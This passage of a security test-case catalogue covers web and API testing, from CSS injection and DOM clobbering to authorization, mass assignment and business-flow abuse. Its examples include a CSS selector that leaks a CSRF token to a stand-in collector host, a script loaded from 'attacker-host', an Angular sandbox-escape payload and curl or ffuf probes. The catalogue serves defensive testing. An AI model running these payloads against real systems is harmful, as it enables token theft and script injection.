Submit a CSS value that changes page layout or injects a background-image URL pointing to a collector.
If a token field is styled by value, craft an attribute selector probe to leak characters one at a time.
tests.ex: location.hash fed to style.cssText = "color: "+hash ; CSS exfil: input[name=csrf_token][value^=a]{background-image:url(https://collaborator-host/log?a)}
tests.exp: User-controlled values never reach a raw CSS sink, and CSS attribute-selector probing cannot read token values.

tests.title: Test client-side resource loading for injection in the request URL
tests.obj: Finds client-side code that loads a script or CORS resource from a URL taken from an untrusted source.
pre: Do not run on production.
steps: Find client-side code that assigns location.hash or a similar source to a script src or XHR URL.
Craft a URL fragment pointing to an attacker-controlled script.
Load the crafted link and confirm the attacker script executes and can read the response.
tests.ex: www.target.com/#https://attacker-host/js.js loaded by d.src=location.hash.slice(1)
tests.exp: Resource URLs built from client-controlled sources are validated against an allowlist before being loaded.

tests.title: Test client-side template rendering for CSTI
tests.obj: Finds client-side frameworks that evaluate user input as template expression syntax.
pre: Do not run on production.
steps: Identify the client-side framework from HTML attributes or the global object in the console.
Submit the generic arithmetic probe {{7*7}} in the field reflected into the template.
If rendered as 49, try a framework-specific sandbox-escape payload to reach arbitrary code execution.
tests.ex: {{ 7*7 }} ; Angular 1.5.x sandbox bypass: {{x={"y":"".constructor.prototype};x["y"].charAt=[].join;$eval("x=alert(1)");}}
tests.exp: User input is bound as data only and is never interpolated into template source that the framework parses as an expression.

tests.title: Test markup sanitization against DOM clobbering
tests.obj: Finds sanitized markup that keeps id or name attributes letting an attacker override a global reference.
pre: Do not run on production.
steps: Submit a probe anchor and image with distinctive id and name values into a field rendered as sanitized HTML.
Open the rendered page and check window and document for the probe properties in the console.
Review client-side code for default values and existence checks read from window or document that may be undefined.
If a clobberable reference feeds a script src or a location assignment, build a clobbering payload for that sink.
tests.ex: then check window.wstgprobe in console
tests.exp: The sanitizer strips id and name attributes from user HTML, or client-side code never reads an unguarded value from window or document.

tests.title: Test content rendering context to prevent incorrect HTML interpretation
tests.obj: Finds direct resources such as uploads or API responses that browsers may render as HTML in the wrong context.
pre: Do not run on production.
steps: Request an uploaded file or API response directly in the browser and inspect the returned Content-Type and Content-Disposition.
Check whether the Sec-Fetch-Dest header is honored to block a navigation request for a non-document resource.
Upload an HTML file and request it directly to see whether it renders as a page.
tests.ex: GET /uploads/user1.html directly, and GET /api/data expecting application/json but served without a disposition header
tests.exp: The server sets a correct Content-Type, uses an attachment disposition or a sandboxed response for user content, and never renders uploads as HTML.

tests.title: Test client-side code for DOM clobbering safe coding practices
tests.obj: Finds global variable use that bypasses explicit declaration, type checking or namespace isolation.
pre: Do not run on production.
steps: Review client-side JavaScript for default values read from window or document without an explicit declaration.
Check whether the code performs strict type checking before trusting a global reference.
Check whether the application namespaces its globals instead of storing state directly on window or document.
tests.ex: Example vulnerable pattern: const config = window.config || {}; without type checking or a namespaced container
tests.exp: All globals are explicitly declared, strictly type-checked before use, and isolated in an application namespace.

tests.title: Call every operation without credentials and with bad credentials
tests.obj: Finds API operations that work without a valid authentication.
pre: The OpenAPI file or a Postman collection of the API.
steps: Build a list of all operations from the API description and the proxy history.
Send each operation without any credential.
Send each operation with an empty, expired and random token or API key.
List every operation that does not return 401.
tests.ex: Newman run with the Authorization header removed; ZAP OpenAPI import plus a script that strips headers; Burp Autorize with an empty session.
tests.exp: Every non-public operation returns 401 without a valid credential. Public operations are listed in the API description.

tests.title: Find all authentication flows and test each one
tests.obj: Finds login paths, such as mobile, deep link or legacy flows, that skip controls.
steps: Ask the engineers for all ways to authenticate to the API.
Find more flows in the client code, the mobile app and the API description.
Test each flow for the same checks: lock out, rate limit and multi-factor.
Compare the results and list flows with weaker controls.
tests.ex: Burp site map filter on /login, /token, /auth, /oauth; ZAP spider; review of the gateway routes.
tests.exp: All authentication flows are known. Every flow applies the same lock out, rate limit and factor checks.

tests.title: Test brute force and credential stuffing limits on API login
tests.obj: Finds login endpoints that allow many password guesses for one account or many accounts.
pre: Use a test account. Agree the volume with the owner of the system.
steps: Send repeated failed logins for one account. Count the requests before a block or delay.
Send one failed login for each of many accounts from one source.
Change the source IP header and the client ID. Check if the limit still holds.
Compare the limit with the limit of normal API calls.
tests.ex: Burp Turbo Intruder or ffuf against POST /auth/login with a short wordlist on a test account; hydra is not needed.
tests.exp: The login limit is stricter than the general API limit. It holds per account and per source, and header changes do not bypass it.

tests.title: Treat password reset and recovery endpoints as login endpoints
tests.obj: Finds recovery endpoints that allow brute force of reset tokens or one-time codes.
steps: Start a reset for a test account. Send wrong tokens to the confirm endpoint many times.
Count the requests before a block.
Check if the token or code can be used more than once.
Check if the limit also applies on the beta or older API hosts.
tests.ex: Burp Intruder on POST /password/reset/confirm with a 6-digit range; compare with the limit on the login endpoint.
tests.exp: Reset endpoints have lock out and rate limits like login. A token cannot be guessed in its lifetime.

tests.title: Check that sensitive account changes need the current password
tests.obj: Finds endpoints that change email, phone or password with only a bearer token.
steps: Find the endpoints that change email, phone number, password or factors.
Send each request with a valid token but without the current password.
Send each request with a wrong current password.
Start a password reset after the email change.
tests.ex: curl -X PUT https://api.example/account -H 'Authorization: Bearer <token>' -d '{"email":"new@x.test"}'
tests.exp: The API asks for the current password or a new login before it changes sensitive data. The request fails without it.

tests.title: Check that credentials and tokens are not sent in the URL
tests.obj: Finds API keys, tokens and passwords that appear in URLs and logs.
steps: List all endpoints that take an API key, token or password.
Read the securitySchemes of the API description for apiKey values with in: query.
Find the endpoints that accept the secret in the query string.
Look in proxy, gateway and server logs for URLs that hold a secret.
Make sure the secret travels in a header or in the body.
tests.ex: Burp search for apiKey, token, access_token in URLs; grep -i 'apikey=' access.log; example of an unsafe URL: /v1/data?apiKey=<key>.
tests.exp: No secret is accepted in the URL. Logs do not show secrets.

tests.title: Check how API keys are used and revoked
tests.obj: Finds API keys that act as user logins or that the owner cannot limit.
steps: List the API keys that the API accepts and the clients that use them.
Check if a key identifies a user. Keys must identify only a client.
Send many requests with one key. Look for 429 responses.
Revoke a test key. Check that it is rejected at once.
tests.ex: curl -H 'X-API-Key: <key>' https://api.example/v1/ping in a loop; review of the key management screen.
tests.exp: API keys identify API clients only. The API rate limits each key and returns 429. A revoked key is rejected.

tests.title: Compare login and reset responses for valid and invalid accounts
tests.obj: Finds differences in status, body or time that reveal which accounts exist.
steps: Send a login with a valid user and a wrong password. Record status, body, length and time.
Send a login with an unknown user. Record the same values.
Repeat for the reset and registration endpoints.
Compare the records.
tests.ex: Burp Comparer and Intruder with response timing; ffuf -mc all -fs <size> against the login endpoint.
tests.exp: Responses for valid and unknown accounts are the same in status, body and time.

tests.title: Send malformed and under-scoped tokens to every operation
tests.obj: Finds token checks that fail with a server error or that ignore scopes and roles.
steps: Send tokens that are truncated, have extra parts or bad Base64.
Check that the response is 401 and not a server error.
Send a valid token with a scope that does not grant the operation.
Send a valid token of a lower role to owner-only operations.
tests.ex: jwt_tool <JWT> -M pb -t https://api.example/v1/me -rh 'Authorization: Bearer JWT'; Postman test that expects 401 or 403.
tests.exp: Bad tokens give 401 and never a 500. A token without the needed scope or role gets 403.

tests.title: Check how the API stores and shows API keys and client secrets
tests.obj: Finds API keys and client secrets that are stored in plain text or shown again.
steps: Create an API key or client secret in a test account. Note how the API shows it.
Read the key list and the key detail endpoints. Look for the full secret in the responses.
Read how the service stores keys: look for plain text and reversible encryption.
Check the length and the random source of the keys.
tests.ex: curl -H 'Authorization: Bearer <token>' https://api.example/v1/keys; review of the key table in a test database; code search for key generation.
tests.exp: The API shows a key once, at creation. The service stores only a hash or an encrypted value. Keys are long and random.

tests.title: Call administrative endpoints as a normal user and as an anonymous client
tests.obj: Finds administrative functions that a client without the right role can call.
pre: Test accounts for each role: anonymous, user, partner and administrator.
Do not run destructive calls on production.
steps: List administrative functions from the API description, the client code and the proxy history.
Call each function with the token of a normal user.
Call each function without a token.
Compare the result with the result for an administrator.
tests.ex: curl -X POST https://api.example/api/admin/deleteUser -H 'Authorization: Bearer <userToken>' -d '{"userId":"12345"}'; Burp Autorize; ZAP forced browse.
tests.exp: The API returns 401 or 403 to every client that lacks the role. The function does not run.

tests.title: Change the HTTP method on each endpoint and check the authorization
tests.obj: Finds functions that are protected for one HTTP method but open for another.
steps: Take a GET endpoint that a normal user may call.
Send PUT, PATCH, DELETE and POST to the same path with the token of the normal user.
Take a POST endpoint of an administrator and send GET to the same path.
Record every change in the status code or in the response body.
tests.ex: curl -X DELETE https://api.example/api/users/12345 -H 'Authorization: Bearer <userToken>'; Burp Repeater method change; ZAP active scan with method fuzzing.
tests.exp: Each method has its own authorization check. The API answers 403 or 405 for methods that the caller may not use.

tests.title: Find privileged functions that sit under normal routes
tests.obj: Finds administrative functions outside the /admin path that have no role check.
steps: Compare the API description with the routes in the code and the client JavaScript.
Look for routes such as /users/export_all and /invites/new next to normal routes.
Guess related names for each normal route and send them as a normal user.
Test old API versions of the same routes.
tests.ex: ffuf -u https://api.example/api/FUZZ -w api-endpoints.txt -H 'Authorization: Bearer <userToken>'; Kiterunner; route list from the framework (rails routes, springdoc).
tests.exp: Every route that changes or exports data checks the role of the caller. The path name does not decide who has access.

tests.title: Test the authorization of each role, group and sub-user
tests.obj: Finds role hierarchy errors that give a user the functions of another group.
steps: Write a table of roles, groups and the functions that each may call.
Include users with two roles, sub-users and partner accounts in the table.
Call each function with each account and mark the result in the table.
Look for results that differ from the table.
tests.ex: Burp AuthMatrix with one session per role; Postman collection with an environment for each role; spreadsheet of expected 200 and 403 results.
tests.exp: The result of each call matches the documented role table. No role can call a function of a higher role.

tests.title: Check deny by default and shared checks for administrative controllers
tests.obj: Finds routes that are open because a developer forgot to add an authorization rule.
steps: Read the authorization module and the code that defines routes.
Make sure the default rule for a new route is to deny access.
Make sure the administrative controllers use one base class or one policy that checks the role.
Add a test route without a rule in a test environment. Call it as a normal user.
tests.ex: Code review of the middleware chain; grep for routes without an authorization annotation; unit test that lists all routes and their policy.
tests.exp: A new route without an explicit rule is denied. Administrative functions share one central role check.

tests.title: Replace object IDs in path and query with IDs of another user
tests.obj: Finds API endpoints that return objects of other users when the object ID changes.
pre: Two test accounts with the same role.
A list of API endpoints from the OpenAPI file or proxy history.
steps: Create user A and user B. Create objects for each, such as orders.
List every endpoint that takes an object ID in the path or in the query string.
Log in as user A. Send each request with an object ID that belongs to user B.
Compare each response with the response that user B gets for the same request.
tests.ex: Burp Autorize or AuthMatrix with the token of user A; curl -H 'Authorization: Bearer <tokenA>' https://api.example/v1/orders/<idB>; Postman collection run with two environments.
tests.exp: The API returns 403 or 404 for objects of other users. It checks the owner of the object on every request.

tests.title: Change other users' objects with PUT, PATCH and DELETE
tests.obj: Finds API write operations that do not check who owns the object.
pre: Do not run on production. Use test objects only.
steps: Create an object as user B and note its ID.
Log in as user A. Send PUT, PATCH and DELETE requests for the object of user B.
Send POST requests that create child objects under the object of user B.
Log in as user B and read the object. Look for changes or deletion.
tests.ex: curl -X DELETE -H 'Authorization: Bearer <tokenA>' https://api.example/v1/documents/<idB>; Burp Repeater with a Match and Replace rule for the token.
tests.exp: The API rejects every write, delete and create request on objects of other users. The object stays unchanged.

tests.title: Test object IDs in request bodies, headers and nested routes
tests.obj: Finds object references outside the path that the API trusts without an owner check.
steps: Find IDs in JSON bodies, custom headers and nested routes such as /users/{id}/orders/{id}.
Change one ID at a time to an ID of user B. Keep the other IDs valid for user A.
Send a parent ID of user A with a child ID of user B.
Repeat for every object type that the API exposes.
tests.ex: Burp Intruder or ZAP fuzzer with a list of IDs of user B; Postman pre-request script that swaps IDs; example request: PUT /v1/users/<idA>/orders/<idB>.
tests.exp: The API checks the owner of each object in the request, also for nested routes. A mismatch between parent and child gives 403 or 404.

tests.title: Test list, search and bulk endpoints for objects of other users
tests.obj: Finds collection endpoints that return all objects instead of the objects of the caller.
steps: Call each list endpoint, such as GET /users or GET /orders, as a normal user.
Add filter parameters such as owner, user_id, tenant or all to the request.
Change the page size and the sort order. Look for objects that the caller does not own.
Send bulk requests that carry many IDs, some of them from user B.
tests.ex: curl 'https://api.example/v1/orders?user_id=<idB>&limit=100' -H 'Authorization: Bearer <tokenA>'; Burp Param Miner for hidden filter names.
tests.exp: List and bulk endpoints return only the objects that the caller may access. Filter parameters cannot widen the result.

tests.title: Test whether unpredictable IDs are the only object protection
tests.obj: Finds objects that any user can read when the user learns the ID from another source.
steps: Collect IDs from list responses, error messages, notification links and shared URLs.
Use an ID of user B that user A can see. Request the object as user A.
Check if IDs are sequential or follow a pattern that a script can guess.
Read the code to make sure an owner check exists for each lookup.
tests.ex: curl with GUIDs taken from the activity feed of user B; Burp Sequencer on a sample of IDs; code search for findById( without an owner filter.
tests.exp: The API denies access even when the caller knows a valid ID. The owner check does not depend on the secrecy of the ID.

tests.title: Test cross-tenant access with changed tenant identifiers
tests.obj: Finds multi-tenant APIs that let one tenant read or change the objects of another tenant.
steps: Create two tenants with one user each. Create objects in both tenants.
Send requests from tenant A with the tenant ID, subdomain or header of tenant B.
Use an object ID of tenant B in a request with the tenant context of tenant A.
Look for data of tenant B in responses, exports and search results.
tests.ex: curl -H 'X-Tenant-Id: <tenantB>' -H 'Authorization: Bearer <tokenA>' https://api.example/v1/invoices/<idB>; Burp Match and Replace on the tenant header.
tests.exp: The API takes the tenant from the validated token or session. A tenant value from the client never widens access.

tests.title: Check that object access uses a policy, not only the token ID
tests.obj: Finds code that compares the user ID in the token to one ID parameter and misses other objects.
steps: Find all handlers that take an object ID from the client.
Read how each handler decides if the caller may use the object.
Find handlers that only compare the token user ID to a request parameter.
Send requests for shared, delegated and group objects to test the policy.
tests.ex: grep -rn 'userId ==' src/ ; review of the authorization middleware; Postman test for an object shared with a group.
tests.exp: A central policy checks the caller, the action and the object for every handler. A single ID comparison is not the only check.

tests.title: Run automated authorization tests for object access in the build
tests.obj: Finds builds that lack regression tests for object-level checks.
steps: Find the test suite for the API in the repository and in the build pipeline.
Look for tests that call each endpoint as a second user and expect 403 or 404.
Remove the owner check in a test branch. Run the pipeline.
Make sure the build fails and that the change cannot be deployed.
tests.ex: Review of CI configuration; Postman or Newman collection with a two-user matrix; Schemathesis with a custom authorization check.
tests.exp: The pipeline has object-level authorization tests for every endpoint. A test that fails blocks the deployment.

tests.title: Compare API response fields with the fields that the client shows
tests.obj: Finds responses that carry sensitive fields which the user interface hides.
steps: Open a page that shows user or object data. Record the API request with a proxy.
List all fields in the JSON response and all fields that the page shows.
Mark fields such as password_hash, api_key, role, internal IDs and IP addresses.
Repeat for list, search and detail endpoints.
tests.ex: Burp Logger++ or browser DevTools Network tab; jq 'keys' on each response; ZAP passive scan rules for information disclosure.
tests.exp: Each response holds only the fields that the client needs and the caller may read. The client does not filter data.

tests.title: Compare the fields in responses for different roles and for anonymous calls
tests.obj: Finds endpoints that return the same rich object to every caller.
steps: Request one object as the owner, as another user, as an administrator and without a token.
Save the four JSON responses.
Compare the field lists with a diff tool.
Look for fields that a lower role should not see.
tests.ex: curl -s ... | jq -S . > owner.json; diff owner.json other.json; Burp Comparer.
tests.exp: Fields depend on the role of the caller and the relation to the object. An anonymous call gets no private fields.

tests.title: Inspect nested objects and error responses for extra properties
tests.obj: Finds embedded objects and error bodies that expose data of other objects.
steps: Request objects that embed other objects, such as an order with a customer and a payment.
Read every nested object for fields that the caller does not need.
Send invalid requests and read the error bodies.
Look for internal notes, card data, internal IDs and file paths.
tests.ex: jq '..|objects|keys' response.json; Burp Search for the strings password, token, secret and internal; ZAP alert list.
tests.exp: Nested objects and error bodies carry only the minimum fields. Sensitive properties of other objects are not shown.

tests.title: Add extra properties to write requests and read the object back
tests.obj: Finds endpoints that write properties which the caller may not change.
steps: Take a valid create or update request. Add fields such as role, isAdmin, balance, price and status.
Send the request. Read the object back with a second request.
Check if the value was stored and if the behavior changed.
Repeat with PATCH, nulls to delete a property and a different Content-Type.
tests.ex: Burp Param Miner; Arjun (arjun -u https://api.example/v1/users/me -m JSON); example body: {"email":"a@b.test","role":"admin"}.
tests.exp: The API ignores or rejects properties that the caller may not write. The stored object does not change for those fields.

tests.title: Find hidden properties with the API description and accepted fields
tests.obj: Finds properties that the API accepts although the schema does not define them.
steps: Read the schema of the request body in the OpenAPI file.
Send each request with one extra property that the schema does not define.
Read the object back and look for the stored value.
Write each accepted extra property in the report.
tests.ex: Schemathesis (st run openapi.json --checks all); ZAP OpenAPI add-on; Burp Param Miner guess JSON properties.
tests.exp: The API rejects properties that the schema does not define, or ignores them. It never stores them.

tests.title: Check how the code limits response and request fields
tests.obj: Finds generic serializers and automatic binders that expose or accept internal properties.
steps: Search the code for to_json, to_string and automatic binders of request data to objects.
Check that each endpoint uses a response schema with named fields.
Check that each endpoint uses an input class or an allowlist of fields.
Check that a block list is not the only protection.
tests.ex: grep -rn 'to_json\|toString()\|@RequestBody\|permit(' src/; review of DTO classes; response schema validation in the gateway.
tests.exp: Responses use fixed schemas. Input binds only to allowed fields. Both are enforced in code or in the gateway.

tests.title: Check that API traffic uses TLS on every hop
tests.obj: Finds API calls to clients, gateways and back ends that use clear text.
steps: Request the API on HTTP and HTTPS. Check if the HTTP request is refused.
Find the links between the gateway, the services and downstream APIs.
Capture traffic on an internal link. Look for clear text.
Check for privileged APIs that need mutual TLS.
tests.ex: curl -v http://api.example/v1/ping; nmap --script ssl-enum-ciphers -p 443 api.example; tcpdump on a test node.
tests.exp: All API communication uses TLS, also inside the network. The API gives no data over clear text.

tests.title: Check security headers and cache control on API responses
tests.obj: Finds API responses that browsers or caches can store or misuse.
steps: Send requests to endpoints with private data. Read the response headers.
Look for Cache-Control: no-store, Content-Type and X-Content-Type-Options.
Look for Strict-Transport-Security and the frame-ancestors value.
Check responses for 304 and for error codes too.
tests.ex: curl -i https://api.example/dm/user_updates.json?conversation_id=1; ZAP passive scan; securityheaders.com style check of the API host.
tests.exp: Responses with private data have Cache-Control: no-store and the other listed headers. Content-Type matches the body.

tests.title: Check the CORS policy of the API
tests.obj: Finds APIs that allow cross-origin reads from untrusted origins.
steps: Send requests with an Origin header of an untrusted domain.
Look at Access-Control-Allow-Origin and Access-Control-Allow-Credentials.
Send a preflight OPTIONS request for sensitive methods.
Disable CORS headers if no cross-origin client exists.
tests.ex: curl -i -H 'Origin: https://evil.test' https://api.example/v1/me; Burp CORS scanner extension.
tests.exp: The API allows only listed origins, and never a wildcard with credentials. An API without browser clients sends no CORS headers.

tests.title: Check that error responses follow a schema and show no internals
tests.obj: Finds error responses with stack traces, queries or paths.
steps: Send invalid JSON, wrong types, absent fields and unknown routes.
Send a very long value and an invalid token.
Read the body of each error response.
Compare the errors with the error schema in the API description.
tests.ex: curl -i -X POST https://api.example/v1/items -d '{bad'; Burp Intruder with malformed values; grep the responses for 'at com.' and 'Traceback'.
tests.exp: Errors are generic and follow the documented schema. They show no stack trace, query or internal path.

tests.title: Check content types, accepted formats and safe response types
tests.obj: Finds endpoints that accept formats which the API does not need or that echo the Accept header.
steps: Send a body with a Content-Type that the endpoint does not list. Expect 415.
Send an XML body to a JSON endpoint and a JSON body to an XML endpoint.
Send an Accept header with an unknown type. Expect 406 or a fixed default.
Check that the response Content-Type matches the body.
tests.ex: curl -i -H 'Content-Type: application/xml' -d '<a/>' https://api.example/v1/items; Burp Content Type Converter.
tests.exp: The API accepts only documented content types and returns 415 or 406 for others. It does not copy Accept into Content-Type.

tests.title: Check that management, debug and health endpoints are not public
tests.obj: Finds management endpoints that reveal configuration or allow actions from the internet.
steps: Request common paths such as /actuator, /metrics, /health, /debug and /admin on the API host.
Read the content of any answer for versions, hosts and secrets.
Check on which port and network the management endpoints listen.
Check the firewall rules for them.
tests.ex: ffuf -u https://api.example/FUZZ -w management-paths.txt; nuclei -t exposures; nmap of the management ports.
tests.exp: Management endpoints are not reachable from the internet. If they must be, they need strong authentication and a restricted network.

tests.title: Test how each server in the proxy chain reads requests
tests.obj: Finds differences in how gateway, proxy and back end read the length of a request.
pre: Test environment only.
steps: List the load balancers, proxies and back ends in front of the API.
Send requests with different Content-Length and Transfer-Encoding headers in a test environment.
Send path forms that the proxy and the back end read in different ways.
Look for desync or access to routes that the gateway blocks.
tests.ex: Burp HTTP Request Smuggler extension; smuggler.py; curl --path-as-is for path forms.
tests.exp: All servers in the chain read each request in the same way. The gateway rules apply to the back end.

tests.title: Send header values that the API writes to its logs
tests.obj: Finds log libraries that expand placeholders in request data and call outside hosts.
steps: Find headers and fields that the API writes to logs, such as X-Api-Version and User-Agent.
Send a unique out-of-band marker string in each of them.
Look for DNS or HTTP calls to your marker server.
Check the version of the log library and the option for lookups.
tests.ex: Burp Collaborator marker in the X-Api-Version header; interactsh; dependency scan with OWASP Dependency-Check.
tests.exp: The API writes request data to logs as text. The log library does not expand lookups and has no known vulnerability.

tests.title: Check the secure baseline and the configuration reviews of the API stack
tests.obj: Finds environments that drift from the hardened baseline or have open cloud permissions.
steps: Read the secure baseline for the API gateway, the services and the cloud.
Compare it with the real settings in each environment.
Check the permissions of cloud storage and orchestration files.
Check for an automated and regular configuration scan.
tests.ex: Review of Terraform or Helm files; Scout Suite or Prowler for cloud checks; kube-bench for clusters.
tests.exp: A repeatable process for a secure baseline exists. Settings are checked by tools in all environments and patches are current.

tests.title: Send hostile data from a mocked third-party API
tests.obj: Finds code that trusts data from other APIs and passes it to databases or downstream systems.
steps: Find the third-party APIs that the service calls and the fields it stores or uses.
Put a mock between the service and the provider. Return injection test strings in each field.
Check the database, logs and downstream calls for the strings.
Return unexpected types, extra fields and very long values.
tests.ex: mitmproxy reverse mode or WireMock as the provider; strings for SQL, NoSQL and HTML in the mocked JSON.
tests.exp: The service validates data from other APIs like user input. Test strings are rejected or handled as data.

tests.title: Test if the service follows redirects from third-party APIs
tests.obj: Finds clients that repeat sensitive requests to a new host after a redirect.
steps: Set a mock provider that answers a POST request with 308 and a Location of another host.
Send a request that holds test data.
Look at the second host for the same request body and headers.
Read the redirect option of the HTTP client.
tests.ex: WireMock stub returning 308 with Location: https://collector.test/; code search for follow_redirects and FollowRedirects.
tests.exp: The service does not follow redirects, or it follows them only to an allowlist and removes secrets from the new request.

tests.title: Check TLS and certificate checks on calls to partner and provider APIs
tests.obj: Finds outbound calls to other APIs that use clear text or skip certificate checks.
steps: List all outbound API calls and the SDK defaults of each provider from the code and the configuration.
Look for http:// URLs and options that turn off certificate checks.
Run the service against a mock with an untrusted certificate. Check that the call fails.
Try to register a partner callback URL that uses http://.
tests.ex: grep -rn 'verify=False\|InsecureSkipVerify\|rejectUnauthorized' src/; mitmproxy with a self-signed certificate.
tests.exp: All calls to other APIs use TLS and check the server certificate. A call with a bad certificate fails. Callback URLs must use https://.

tests.title: Test timeouts and size limits for third-party responses
tests.obj: Finds services that hang or use much memory when a provider is slow or sends large data.
pre: Test environment only.
steps: Make a mock provider that answers after a long delay.
Make the mock send a very large response body.
Watch the threads, memory and response time of the service.
Check the circuit breaker and the fallback.
tests.ex: toxiproxy with a latency toxic; WireMock fixed delay; a 1 GB response stream from the mock.
tests.exp: Every outbound call has a timeout and a size limit. The service stays available and fails in a safe way.

tests.title: Check that inbound callbacks and partner messages are authenticated
tests.obj: Finds endpoints that trust calls from partners and do not check who sent them.
steps: List the endpoints that third parties call, such as webhooks and callbacks.
Send a call with no signature, a wrong signature and an old timestamp.
Replay a valid call.
Check the payload against the schema.
tests.ex: curl -X POST https://api.example/hooks/payment with a changed X-Signature header; Postman pre-request script for HMAC.
tests.exp: The service accepts only signed and fresh calls from known partners. It validates the payload like user input.

tests.title: Review the security of providers and the data sent to them
tests.obj: Finds integrations added without a check of the provider or of the data shared.
steps: List the providers and the data fields sent to each.
Read the provider assessment: transport, authentication, validation and cost limits.
Make sure the service sends only needed fields.
Check where the provider keys are stored and who can read them.
tests.ex: Review of vendor questionnaires; secret store audit; data field list per provider.
tests.exp: Each provider has a security assessment. The service sends only the data that the provider needs.

tests.title: Test sensitive business flows of the API for scripted abuse
tests.obj: Finds flows such as purchase, reservation and post creation that a script can abuse at scale.
pre: A document from the business owner that names the sensitive flows.
Use test stock and test accounts.
steps: Write a list of business flows and mark the ones that harm the business when used too often.
Call each marked flow with a script at a high rate from one source.
Call it again from many sources.
Record what blocks the script: rate limit, captcha, device checks or review.
tests.ex: Burp Turbo Intruder; Postman runner; a Python requests loop on a test product with limited stock.
tests.exp: Each marked flow has controls that slow a script, and the business owner agreed the limits.

tests.title: Test referral and credit programs for scripted account creation
tests.obj: Finds referral and bonus flows that a script can use to collect credit.
pre: Test environment only.
steps: Read the rules of the referral program.
Create several test accounts with a script. Use each to credit one main account.
Check if email, phone or device checks block the script.
Check if the credit can turn into cash or products.
tests.ex: Python script that calls POST /register and POST /referral/claim; Burp macro for the sign-up step.
tests.exp: The sign-up and the credit steps have checks for scripted use. Credit is not given before the new account is confirmed.

tests.title: Test reservation holds for abuse that blocks other users
tests.obj: Finds flows where one client can hold all slots or seats and cancel them in bulk.
steps: Reserve many slots or seats with one account without payment.
Check the time limit of an unpaid hold.
Cancel all reservations at once.
Check if fees, limits or delays apply.
tests.ex: Postman runner with a loop on POST /reservations; check the hold expiry time in the response.
tests.exp: One account can hold only a small number of slots. Unpaid holds expire quickly. Bulk cancel has a limit.

tests.title: Call later workflow steps without the earlier steps
